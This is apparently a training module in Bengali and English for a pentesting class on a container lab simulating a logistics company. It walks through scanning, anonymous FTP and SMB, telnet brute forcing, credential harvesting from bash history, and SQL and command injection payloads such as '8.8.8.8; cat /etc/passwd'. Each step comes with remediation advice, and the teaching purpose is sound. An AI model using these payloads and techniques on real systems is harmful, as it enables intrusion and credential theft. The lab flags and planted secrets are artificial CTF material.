# 🏢 Enterprise Network Penetration Testing — Class Module
### *"From Zero Knowledge to Full Compromise — Black-box to Gray-box"*

> **Instructor:** [নাম]
> **Duration:** 4–5 Hours
> **Lab:** Nexus Global Enterprise — Live VPS
> **Level:** Beginner → Intermediate
> **Target:** `<VPS_IP>`

---

## 🕐 Schedule

| Phase | Topic | Mode | Time |
|:---|:---|:---:|:---:|
| **Opening** | Scan Launch + Class Intro | 💻 Live | 2 min |
| **Phase 1** | Enterprise Architecture + Methodology | 📖 Lecture | 30 min |
| **Phase 2** | Recon Results + UDP + HTML Report | 💻 Live Demo | 20 min |
| **Phase 3** | Service Analysis + Black-box Attacks | 💻 Live Demo | 40–50 min |
| ☕ | **Break** | — | 15 min |
| **Phase 4** | Gray-box Full Pentest Chain | 💻 Live Demo | 60–75 min |
| **Phase 5** | CTF / Classwork | 🔥 Hands-On | 30 min |
| **Phase 6** | Wrap-up + Kill Chain | 📖 Debrief | 15 min |

---

# 🚀 CLASS OPENING — Scan First (2 min)

> *"আজকে আমরা একটা পুরো কোম্পানির network hack করবো। শুরু করার আগে একটা কাজ করি — scan দিয়ে দিই, background এ চলতে থাকুক। Scan চলার সময় আমরা সব explain করবো।"*

**Immediately terminal এ scan দাও:**

```bash
nmap -p- <VPS_IP> --open -T4 -oX tcp_full.xml
```

> *"এই scan ৩-৪ মিনিট লাগবে। এর মধ্যে আমরা জানবো — আজকে কোথায় আছি, কী করবো, কেন করবো।"*

---

# 🟢 PHASE 1 — Enterprise Architecture + Methodology (30 min)
## *Scan চলার সময় — Background context*

---

### 🏙️ এই Lab কী? (2 min)

```bash
docker ps --format "table {{.Names}}\t{{.Status}}"
```

> *"দেখো — ৩৩টা container মিলে একটা পুরো কোম্পানি চলছে। এটা একটা Bangladesh logistics কোম্পানির মতো — Nexus Global Enterprise। আজকে আমরা এদের authorized pentest করছি।"*

---

### 🗺️ Enterprise Network Zones (12 min)

**`enterprise-network.html` browser এ খুলো:**

```
INTERNET (আমরা — attacker)
     │
     ▼
┌─────────────────────────────────────────────┐
│  WAN / ISP Layer  (198.51.100.0/24)         │
│  Edge Router, DDoS Protection               │
└─────────────────────┬───────────────────────┘
                      │
                      ▼
┌─────────────────────────────────────────────┐
│  DMZ  (10.0.1.0/24)                        │  ← আমরা এখানে ঢুকবো
│  WAF · Web Portal · Mail · Bastion         │
│  FTP · Telnet · SNMP · Exposed PostgreSQL  │
└─────────────────────┬───────────────────────┘
                      │ Firewall
                      ▼
┌─────────────────────────────────────────────┐
│  Core Backbone  (10.0.2.0/24)               │
│  Active Directory · SIEM · NAC · Grafana    │
└─────────────────────┬───────────────────────┘
                      │
          ┌───────────┴───────────┐
          ▼                       ▼
┌─────────────────┐   ┌──────────────────────┐
│  Data Center    │   │  Campus Network      │
│  (10.0.3.0/24) │   │  (10.0.4.0/24)       │
│  DB · ERP · SAN│   │  Workstations · VoIP │
│  MinIO Backup  │   │  IoT · CCTV Cameras  │
└─────────────────┘   └──────────────────────┘
```

| Zone | কী থাকে | Real-world Example |
|:---|:---|:---|
| **WAN/DMZ** | Internet-facing services | Website, mail, VPN |
| **Core** | Internal infrastructure | AD, monitoring, NAC |
| **Data Center** | Business-critical data | Database, ERP, Backup |
| **Campus** | Employee devices | Laptops, phones, CCTV |

> *"Firewall আছে মানে সব safe না। একটা zone compromise হলে সেখান থেকে pivot করা যায়। আজকে এটাই দেখাবো।"*

**MITRE ATT&CK:** `TA0043 — Reconnaissance`

---

### ⚫⬜ Pentest Methodology (13 min)

**Black-box:**
- Client শুধু একটা IP দিয়েছে — কিছুই জানো না
- Real hacker এর perspective
- ❌ Days/weeks লাগে, attack surface miss হয়

**Gray-box:**
- Client credentials + network map দিয়েছে
- Insider threat / stolen credential simulate করে
- ✅ কম সময়ে সব vulnerability cover করা যায়

> *"Real world এ ৮০% pentest gray-box। আজকে দুটোই করবো — প্রথমে black-box, তারপর gray-box switch করবো।"*

**Rules of Engagement:**
```
CLIENT:      Nexus Global Enterprise
SCOPE:       VPS IP: <VPS_IP>
AUTHORIZED:  Red Team Assessment
FLAG FORMAT: FLAG{...}
OUT OF SCOPE: DoS attack নেই, data delete নেই
```

**আজকের Attack Plan:**
```
Black-box:  nmap → FTP anon → Web recon → SNMP → MailHog
Gray-box:   Bastion → Internal sweep → SMB creds
            → Production DB → SQLi + RCE → Grafana → MinIO
```

---

# 🔵 PHASE 2 — Recon Results + UDP + HTML Report (20 min)

---

### ✅ TCP Scan Result

**Scan শেষ হলে output দেখাও:**

```
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh          ← VPS SSH (out of scope)
23/tcp   open  telnet
53/tcp   open  domain
80/tcp   open  http
1025/tcp open  smtp         ← MailHog SMTP
2222/tcp open  ssh          ← Lab Bastion
3000/tcp open  http         ← Grafana
8025/tcp open  http         ← MailHog Web UI
8080/tcp open  http         ← DDoS Proxy
8444/tcp open  https        ← ZTNA Gateway
8554/tcp open  rtsp         ← IP Camera
8888/tcp open  http         ← HLS Stream
9001/tcp open  http         ← MinIO Console
9003/tcp open  http         ← MinIO Console (DR)
```

> *"`tcp_full.xml` তৈরি হয়ে গেছে — পরে HTML report বানাবো।"*

---

### 📡 UDP Top 1000 Scan

> *"TCP শেষ। এখন UDP। UDP connectionless — handshake নেই, তাই slow। সব ৬৫৫৩৫ port scan অসম্ভব — তাই top ১০০০।"*

```bash
sudo nmap -sU --top-ports 1000 <VPS_IP> -T4 -oX udp_top1000.xml
```

| Flag | মানে |
|:---|:---|
| `-sU` | UDP scan mode |
| `--top-ports 1000` | Most common ১০০০ UDP ports |
| `-oX` | XML এ save |

**Expected Output:**
```
161/udp  open  snmp   ← TCP scan এ দেখায়নি!
5060/udp open  sip    ← TCP scan এ দেখায়নি! (VoIP)
```

> *"এই দুটো TCP scan এ সম্পূর্ণ invisible ছিল। তাই দুটো scan-ই দরকার।"*

---

### 🌐 HTML Report (xsltproc)

```bash
which xsltproc || sudo apt install xsltproc -y

xsltproc /usr/share/nmap/nmap.xsl tcp_full.xml -o tcp_report.html
xsltproc /usr/share/nmap/nmap.xsl udp_top1000.xml -o udp_report.html

python3 -m http.server 9999
# → http://<VPS_IP>:9999/tcp_report.html
```

> *"Client কে এই HTML report পাঠাবে — terminal output না।"*

---

### 🔬 Version Fingerprint

```bash
nmap -sV -sC -p 21,23,80,2222,8025,8080,8554,8888,9001,9003 <VPS_IP>
```

```
21/tcp   ftp   vsFTPd 3.0.5 — Anonymous login allowed!
23/tcp   telnet hostname: dmz-mon-01
80/tcp   http  nginx/1.31.4
               robots.txt: /admin-console/ /api/network/
2222/tcp ssh   OpenSSH 9.6
8025/tcp http  MailHog Web UI
8554/tcp rtsp  mediamtx (IP Camera)
9001/tcp http  MinIO Console
```

> *"FTP anonymous login + robots.txt এ sensitive paths — এখনই interesting।"*

**MITRE:** `T1595` `T1592`

---

# 🟠 PHASE 3 — Service Analysis + Black-box Attacks (40–50 min)

---

### 🎯 Attack Surface

```
Port 21   → FTP        → Anonymous login?
Port 23   → Telnet     → Plaintext creds?
Port 80   → HTTP       → Web vulnerabilities?
Port 8025 → MailHog   → Unauthenticated?
Port 161/udp → SNMP   → Community string 'public'?
Port 9001 → MinIO     → Default creds?
```

---

### 🔴 Attack #1 — FTP Anonymous Login (Port 21)

> *"FTP = 1971 এর protocol। Anonymous = username: anonymous, password: যেকোনো।"*

```bash
ftp <VPS_IP>
# Name: anonymous | Password: test@test.com
```

```bash
ftp> cd pub && ls
# README.txt  infrastructure_report.txt  internal_network_map.txt

ftp> get infrastructure_report.txt
ftp> get internal_network_map.txt
ftp> quit

cat infrastructure_report.txt
```

```
CRITICAL FINDINGS:
[CRIT-01] Anonymous SMB on dc01 (10.0.2.10) — hardcoded DB creds
[CRIT-02] MQTT Broker unauthenticated (10.0.4.70)
[HIGH-01] LDAP anonymous bind (dc01 / 10.0.2.10)
[HIGH-02] VoIP extension 1003 PIN: 1234
[HIGH-03] RTSP camera — no authentication
```

```bash
cat internal_network_map.txt
```

```
DMZ:         10.0.1.40  bastion
Core:        10.0.2.10  dc01 (Active Directory DC)
             10.0.2.21  Grafana
Data Center: 10.0.3.20  db-prod-01 (PostgreSQL)
             10.0.3.30  san-backup-01 (MinIO)
Campus:      10.0.4.20  dev-workstation-01 (tahmed)
             10.0.4.10  hr-workstation-01 (sjenkins)
```

**Black-box Goldmine:**
```
✅ Internal network map (সব subnet, IP, hostname)
✅ Usernames: tahmed, sjenkins
✅ DB credentials location: dc01 SMB → IT-Backups
✅ Production DB IP: 10.0.3.20
✅ VoIP PIN: extension 1003 → 1234
✅ MQTT unauthenticated (10.0.4.70)
```

> *"Company র নিজের CONFIDENTIAL audit report publicly accessible FTP তে।"*

**MITRE:** `T1083` `T1552.001` `T1087`

---

### 🔴 Attack #2 — Telnet (Port 23)

> *"Telnet = 1969 এর protocol। সব data plaintext — password সহ।"*

```bash
telnet <VPS_IP>
# Output: dmz-mon-01 login:  ← hostname leak!
```

```bash
hydra -l root -P ~/wordlists/nexus-passwords.txt telnet://<VPS_IP>
```

> *"Background এ চলুক — এগিয়ে যাই।"*

**MITRE:** `T1110.001`

---

### 🔴 Attack #3 — Web Portal (Port 80)

```bash
curl http://<VPS_IP>/robots.txt
```

```
Disallow: /admin-console/
Disallow: /api/v1/
Disallow: /api/network/
# Internal ERP: http://10.0.3.10:8000
# /api/network/ping (internal diagnostic)
# App: Nexus-Portal v2.4.1
```

```bash
curl -X POST http://<VPS_IP>/login -d "username=admin&password=admin"
# ❌ Fails — Gray-box এ করবো
```

**MITRE:** `T1592.003` `T1083`

---

### 🎥 Attack #4 — IP Camera RTSP (Port 8554)

```bash
vlc rtsp://<VPS_IP>:8554/live      # path জানা নেই
cameradar -t <VPS_IP>               # path bruteforce
```

**MITRE:** `T1125`

---

### 📧 Attack #5 — MailHog (Port 8025)

```
http://<VPS_IP>:8025
→ No login — inbox directly visible
→ Password resets, internal notifications intercept possible
```

**MITRE:** `T1114`

---

### 📡 Attack #6 — SNMP (Port 161/UDP)

```bash
snmpwalk -v2c -c public <VPS_IP>
```

```
sysDescr.0 = Linux nexus-gateway 5.15.0
sysName.0  = nexus-gateway
ifDescr.2  = eth0
ifDescr.3  = br-campus
```

> *"Community string 'public' — OS, hostname, network interfaces সব।"*

**MITRE:** `T1082` `T1046`

---

### 🗄️ Attack #7 — MinIO (Port 9001)

```
http://<VPS_IP>:9001 → Login required
→ Black-box: identify করলাম — Gray-box এ ঢুকবো
```

---

### 🛑 Black-box Limit

```
✅ পেলাম:   FTP files · Web paths · SNMP info · MailHog
❌ পেলাম না: Portal SQLi/RCE · Internal networks · DB · SMB
```

> *"এখানেই hacker আটকে days/weeks কাটাতো। আমরা gray-box এ switch করবো।"*

---

# ☕ BREAK — 15 min

> *"Try করো: `http://<VPS_IP>/?track_id=' OR 1=1--`"*

---

# 🔴 PHASE 4 — Gray-box Full Pentest (60–75 min)

---

### 🔔 Gray-box Switch

> *"Client credentials দিলো। Hacker এর weeks/months skip করে directly test করবো।"*

```
📋 Gray-box Info:
   Bastion:   devops-remote@<VPS_IP>:2222 | devops-remote@123
   AD Domain: nexus.internal (10.0.2.10)
   User:      tahmed / DevOpsP@ss2026!
   Grafana:   10.0.2.21:3000
```

> **Gray-box এ প্রতিটা Exclusive = একটা specific vulnerability demonstrate করে।**
> Credential শুধু starting point — এরপর প্রতিটা step এ নতুন misconfiguration expose হয়।

---

### 🔍 Internal Network Discovery

```bash
ssh devops-remote@<VPS_IP> -p 2222
```

```
╔══════════════════════════════════════════════════════════╗
║   NEXUS GLOBAL ENTERPRISE — SSH BASTION HOST (DMZ)      ║
║   Node: bastion.nexus.internal | IP: 10.0.1.40          ║
║   Core:        10.0.2.0/24  (AD-DC, SIEM, Grafana)     ║
║   Data Center: 10.0.3.0/24  (ERP, DB, SAN)             ║
║   Campus:      10.0.4.0/24  (Workstations)              ║
╚══════════════════════════════════════════════════════════╝
```

```bash
ip route
# 10.0.2.0/24 dev eth1  ← Core
# 10.0.3.0/24 dev eth2  ← Data Center
# 10.0.4.0/24 dev eth0  ← Campus
```

```bash
for i in $(seq 1 254); do
  (ping -c1 -W1 10.0.2.$i &>/dev/null && echo "10.0.2.$i UP") &
done; wait

for i in $(seq 1 254); do
  (ping -c1 -W1 10.0.3.$i &>/dev/null && echo "10.0.3.$i UP") &
done; wait
```

```
10.0.2.10  → AD Domain Controller
10.0.2.21  → Grafana
10.0.2.99  → SIEM/SOC
10.0.3.10  → Internal ERP
10.0.3.20  → Production PostgreSQL  ← TARGET
10.0.3.30  → MinIO Backup
```

---

### 💎 Exclusive #1 — Workstation Credential Harvest

```bash
docker exec -it nexus-pc-dev-01 bash

cat ~/.bash_history
# psql -h 10.0.3.20 -U nexus_admin ...  ← DB password!

cat ~/.ssh/id_rsa
env | grep -iE "pass|secret|key|token"
cat ~/.pgpass 2>/dev/null
```

**MITRE:** `T1552.003` `T1552.004`

> ⚠️ **Vulnerability:** Credentials plaintext এ bash_history + env vars এ stored
> 🔧 **Fix:** Secrets manager use করো (HashiCorp Vault / AWS Secrets), bash_history clear করো, workstation access restrict করো

---

### 💎 Exclusive #2 — SMB Share Credential Leak

```bash
smbclient -L //10.0.2.10 -N
```

```
IT-Backups  Disk  IT Engineering Backup (RESTRICTED)
HR-Public   Disk  HR Shared Policies
```

```bash
smbclient //10.0.2.10/IT-Backups -N
smb: \> get sync_prod_db.sh
smb: \> exit

cat sync_prod_db.sh
```

```bash
DB_PASS="Nexu$Prod2026!Sec"                     # ← Production DB!
SAN_PASS="SuperS3cUr3_B4ckup_Vault_Pass_2026!"  # ← MinIO!
```

> *"RESTRICTED লেখা — anonymous access — plaintext passwords।"*

**MITRE:** `T1039` `T1552.001`

> ⚠️ **Vulnerability:** RESTRICTED share অথচ anonymous read allowed + credentials plaintext script এ
> 🔧 **Fix:** সব SMB share এ authentication enforce করো, credentials কখনো script এ রাখবে না

---

### 💎 Exclusive #3 — Production Database (Crown Jewels)

```bash
PGPASSWORD='Nexu$Prod2026!Sec' psql -h 10.0.3.20 -U nexus_admin -d nexus_prod
```

```sql
SELECT * FROM system_vault_keys;
```

```
AWS_TRANSIT_GATEWAY_KEY  → AKIA-NEXUS-PROD-9812448109-SECKEY-ALPHA
SWIFT_CLEARING_API_TOKEN → jwt_live_nexus_swift_bank_tx_881920194012948102
CTF_FLAG_DATABASE_ROOT   → FLAG{CR0WN_J3W3LS_DC_D4T4B4S3_C0MPR0M1S3D_2026!}
```

```sql
SELECT * FROM employees LIMIT 5;
SELECT * FROM payroll LIMIT 3;
```

```
💳 SWIFT Token → wire fraud possible
☁️  AWS Key    → cloud infrastructure takeover
💰 Payroll     → financial fraud
```

**MITRE:** `T1078.002` `T1213`

> ⚠️ **Vulnerability:** DB password script এ + DB সব internal IP থেকে accessible, কোনো IP restriction নেই
> 🔧 **Fix:** Secrets manager, DB access শুধু application server IP তে restrict, audit logging enable

---

### 💎 Exclusive #4 — Web Portal: SQLi + Command Injection

**Login:** `http://<VPS_IP>/login` → `admin / NexusTechAdmin2026!`

**Part A — SQL Injection:**
```
' UNION SELECT username,password,role,full_name,1,1 FROM portal_users--
```
```
→ FLAG{SQL_1NJ3CT10N_DMZ_W3B_PORTAL_2026}
```

**Part B — Command Injection (Ping Tool):**
```
8.8.8.8; id        → uid=0(root) gid=0(root)
8.8.8.8; hostname && ip addr | grep inet
8.8.8.8; cat /etc/passwd | head -5
```

> *"uid=0(root) — web server ROOT হিসেবে চলছে।"*

**MITRE:** `T1190` `T1059.004` `T1068`

> ⚠️ **Vulnerability:** SQL + Command injection — কোনো input validation নেই, web server root হিসেবে চলছে
> 🔧 **Fix:** Parameterized queries, command whitelist/validation, web server non-root user এ চালাও

---

### 💎 Exclusive #5 — Grafana

```bash
curl -s http://10.0.2.21:3000/api/org
# {"id":1,"name":"Main Org."} → Anonymous access!

curl -s http://10.0.2.21:3000/api/health
# {"version":"13.2.0",...}
```

```
http://<VPS_IP>:3000
→ nexus_nms_admin / NMS@Nexus2026! → Admin
→ Version 13.2.0 → CVE check
```

**MITRE:** `T1078.001` `T1518`

> ⚠️ **Vulnerability:** Anonymous access enabled + weak admin credentials + outdated version
> 🔧 **Fix:** Disable anonymous access, strong password + MFA, update Grafana, restrict to internal network

---

### 💎 Exclusive #6 — MinIO Backup Storage

```
http://<VPS_IP>:9001
→ nexus_san_root / SuperS3cUr3_B4ckup_Vault_Pass_2026!
→ Full Admin → Nightly backup = full DB dump here
```

**MITRE:** `T1530`

> ⚠️ **Vulnerability:** Weak credentials + no MFA on backup storage, publicly accessible port
> 🔧 **Fix:** Strong credentials + MFA, MinIO internal network এ restrict করো, backup encrypt করো

---

# 🔥 PHASE 5 — Student Tasks + CTF (30 min)

### 🖥️ Black-box Tasks — নিজে করো

| # | Task | Tool |
|:---|:---|:---|
| 1 | VPS এর সব open TCP port খুঁজো | `nmap -p-` |
| 2 | FTP anonymous login → sensitive files download করো | `ftp` |
| 3 | SNMP walk → OS + hostname + interfaces বের করো | `snmpwalk -v2c -c public` |
| 4 | Web robots.txt → hidden paths + internal IP বের করো | `curl` |

### 🔴 Gray-box Tasks — credentials দিয়ে

| # | Task | Tool |
|:---|:---|:---|
| 5 | Bastion SSH → `ip route` → কোন networks? | `ssh -p 2222` |
| 6 | Core + DC network ping sweep → সব hosts | `for+ping` |
| 7 | tahmed workstation → bash_history check করো | `docker exec` |
| 8 | SMB IT-Backups → sync_prod_db.sh download করো | `smbclient` |

### 🚩 FLAG Challenges

| Flag | Task | Hint |
|:---|:---|:---|
| 🚩 FLAG 1 — Easy | Portal Tracking ID → SQLi → employees dump | `' UNION SELECT ...` |
| 🚩 FLAG 2 — Medium | Portal Ping Tool → Command Injection → `/etc/passwd` | `8.8.8.8; cat /etc/passwd` |
| 🚩 FLAG 3 — Hard | SMB creds → PostgreSQL → `system_vault_keys` | `smbclient //[IP]/IT-Backups` |

### 💬 Discussion (প্রতিটা task এর পর)

```
→ এই vulnerability কীভাবে real company তে হয়?
→ এটা black-box এ পাওয়া সম্ভব ছিল?
→ Fix কী হবে?
```

---

# 📊 PHASE 6 — Wrap-up (15 min)

### 🔗 Kill Chain

```
Black-box:
  nmap -p- → 15+ open ports
  FTP anon → internal map + creds location
  robots.txt → paths + ERP IP + version
  SNMP → OS + network info
  [BLOCKED] Portal, internal networks

  ↓ ↓ Gray-box Switch ↓ ↓

Gray-box:
  Bastion → ping sweep → all internal hosts
  Workstation bash_history → DB creds leaked
  SMB IT-Backups (anonymous!) → DB + MinIO creds
  PostgreSQL → FLAG + SWIFT + AWS keys
  Portal SQLi → FLAG + user dump
  Portal CMDi → uid=0(root)
  Grafana → admin access
  MinIO → backup storage admin
```

### 📝 Report

```
1. Executive Summary       → non-technical, board level
2. Technical Findings (CVSS)
   SQLi on Web Portal          9.8  Critical
   Command Injection            9.0  Critical
   Credentials in Bash History  8.5  High
   SMB Credential Leak          8.1  High
   Production DB Direct Access  9.8  Critical
3. Attack Chain Diagram
4. Evidence (screenshots, command outputs)
5. Remediation
```

### 🎓 Key Takeaways

```
Black-box → কী publicly accessible
Gray-box  → সত্যিকারের security posture

Black-box:  2 findings
Gray-box:   6+ critical/high (বেশিরভাগ black-box এ invisible)
```

> *"Real attacker এর unlimited time আছে। তোমার নেই। Gray-box দিয়ে সেই gap bridge করো।"*

**Next Class:** Active Directory exploitation · VoIP SIP · MQTT IoT · Cloud SSRF + JWT

---

## 📊 Module Summary

| Metric | Value |
|:---|:---:|
| Duration | 4–5 Hours |
| TCP Ports | All 65535 |
| UDP Ports | Top 1000 |
| Report | XML → xsltproc → HTML |
| Gray-box Flags | SQL_1NJ3CT10N + CR0WN_J3W3LS |
| MITRE TTPs | 14+ |
| Services | FTP · Telnet · HTTP · SMB · PostgreSQL · Grafana · MinIO · RTSP · SNMP · VoIP |

---

## 🎨 WOW Moments

| Moment | কেন Impressive |
|:---|:---|
| `docker ps` — 33 containers | "পুরো কোম্পানি!" |
| nmap live scan | "সব port দেখছি" |
| FTP → confidential audit report | "Anonymous এ company র secret!" |
| SMB RESTRICTED → anonymous | "RESTRICTED তবুও ঢুকলাম" |
| DB → SWIFT + AWS + Azure keys | Crown Jewels |
| CMDi → uid=0(root) | "Browser থেকে server control" |
| Gray-box switch | Dramatic moment |
| Bastion ip route → 4 networks | "এক জায়গা থেকে সব" |
